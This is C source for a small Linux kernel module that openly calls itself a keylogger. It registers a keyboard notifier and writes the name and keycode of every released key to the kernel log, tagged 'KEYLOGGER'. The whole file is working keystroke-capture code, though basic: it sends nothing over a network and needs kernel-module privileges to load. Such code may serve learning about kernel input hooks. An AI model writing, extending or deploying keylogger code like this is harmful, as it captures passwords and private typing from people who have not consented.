#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include "keylogger.h"

static int notify_handler(struct notifier_block *nblock, unsigned long code, void *inparam)
{
	struct keyboard_notifier_param *param = inparam;

	if (code == KBD_KEYCODE && !param->down)
		printk(KERN_DEBUG "KEYLOGGER %s pressed(keycode %i)\n", param->value < 121 ? keycode_map[param->value] : "", param->value);
	return 1;
}

static struct notifier_block nb = {
	.notifier_call = notify_handler
};

static int mod_init(void)
{
	register_keyboard_notifier(&nb);
	return 0;
}

static void mod_exit(void)
{
	unregister_keyboard_notifier(&nb);
}

MODULE_LICENSE("Dual BSD/GPL");
module_init(mod_init);
module_exit(mod_exit);
